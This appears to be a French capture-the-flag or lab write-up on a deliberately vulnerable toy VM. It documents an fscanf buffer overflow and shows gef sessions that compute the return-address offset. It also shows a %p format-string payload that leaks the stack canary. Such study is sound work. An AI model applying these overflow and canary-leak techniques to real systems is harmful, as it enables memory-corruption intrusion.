## Fonctionnement de la VM

1. Point d'entrée `main()`
2. Prise de l'input
3. Boucle sur chaque input
    - Appel `vuln_function(input, insn)`
    - Appel `exec_instructions(insn)`

### `vuln_function`

Deux buffers :

```c
char cmd[256];
char op1[256];
```

Itère sur toutes les `cmds` :

```c
struct cmd_fun_t
{
    // command name
    char    *cmd;
#define NO_OP   0
#define OP_INT  1
#define OP_STR  2
    // operand type
    int     flag_operand;
    // function to execute
    void    (*f)(struct cmd_state_t*);
};
```

```c
struct cmd_fun_t    cmds[] = {
    // cmd | flag op | p* to function
    {"dump", NO_OP, dump},
    {"prints", OP_STR, prints},
    {"printd", OP_INT, printd},
    {"add", NO_OP, add},
    {"mul", NO_OP, mul},
    {"div", NO_OP, divide},
    {"mod", NO_OP, mod},
    {"load_b", OP_INT, load_b},
    {"load_c", OP_INT, load_c},
    {"mov_b", NO_OP, mov_b},
    {"mov_c", NO_OP, mov_c},
    {"mov_si", NO_OP, mov_si},
    {"mov_di", NO_OP, mov_di},
#if LEVEL < 8
    {"fetch_buf", OP_STR, fetch_buf},
#endif
    {"movmem", NO_OP, movmem},
    {"swapdisi", NO_OP, swapdisi},
    {"jmp", OP_INT, jmp},
    {"cmp_ab", NO_OP, cmp_ab},
    {"cmp_bc", NO_OP, cmp_bc},
    {"cmp_ac", NO_OP, cmp_ac},
    {"je", OP_INT, je},
    {"jne", OP_INT, jne},
    {"jlt", OP_INT, jlt},
    {"jle", OP_INT, jle},
    {"jgt", OP_INT, jgt},
    {"jge", OP_INT, jge},
    {"push_a", NO_OP, push_a},
    {"push_b", NO_OP, push_b},
    {"push_c", NO_OP, push_c},
    {"push_si", NO_OP, push_si},
    {"push_di", NO_OP, push_di},
    {"pop_a", NO_OP, pop_a},
    {"pop_b", NO_OP, pop_b},
    {"pop_c", NO_OP, pop_c},
    {"pop_si", NO_OP, pop_si},
    {"pop_di", NO_OP, pop_di},
    {"call", OP_INT, call},
    {"ret", NO_OP, ret},
    {"connect", NO_OP, connect},
    {"disconnect", NO_OP, disconnect},
    {0, 0},
};
```

Pour chaque itération, l'argument de la commande est *validé*.

La ligne 134 est vulnérable à un buffer overflow :
```c
char op1[256];
// ...
int rdstr = fscanf(input, " %s", op1);
```

## Level 1

```shell
$ gef bin/my_vm1

gef➤ b vuln_function
gef➤ r
gef➤ disass

# trouver l'adresse de la fonction fscanf et on break dessus
gef➤ b *0x00000000004025da
# stack frame
gef➤ p/x $rbp

# adresse à écraser
gef➤ p/x &op1

# on veut le nb d'octets à écraser
# où `((char*)$rbp + 8)` => adresse de retour de vuln_function()
# où `(char*)&op1` => adresse du buffer
p/d ((char*)$rbp + 8) - (char*)&op1 - 4
```

## Level 3

Trouver le nombre de padding à remplir pour bypass le canary :

```shell
gef➤  checksec
[+] checksec for '/media/sf_shared/my_vuln_vm/ref/bin/my_vm3'
Canary                        : ✓ (value: 0x4e02d9950d5b4800)
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
gef➤  x/gx $rbp
0x7fffffff9f00: 0x00007fffffffddb0
gef➤  x/gx $rbp-8
0x7fffffff9ef8: 0x4e02d9950d5b4800
gef➤  p/d ((char*)$rbp - 8) - (char*)&op1
$1 = 264
```

On trouve la stack canary en brute-force avec plusieurs formats specifiers. On connaît son adresse grâce au `checksec`, il suffit de l'identifier dans la chaîne affichée et de compter les occurences. Ici c'est l'équivalent de 43.

```shell
gef➤  checksec
[+] checksec for '/media/sf_shared/my_vuln_vm/ref/bin/my_vm3'
Canary                        : ✓ (value: 0xc78c3a3f82554400)
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
gef➤  c
Continuing.
sz: 1 OP: %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
read prints
Enter command: exec
SZ 1 CMD: exec
EXEC INSN IP 0
EXEC PRINTS
0x405b80-0xffffffffffffffeb-0x35-0x96-0xa0-(nil)-0x7fffffff7630-(nil)-0x7fffffff74d8-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d7025-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0xc78c3a3f82554400-0x7fffffff9f00-0x4023fc-(nil)-0x7fffffff9f30-(nil)-0x405ac0-(nil)
```
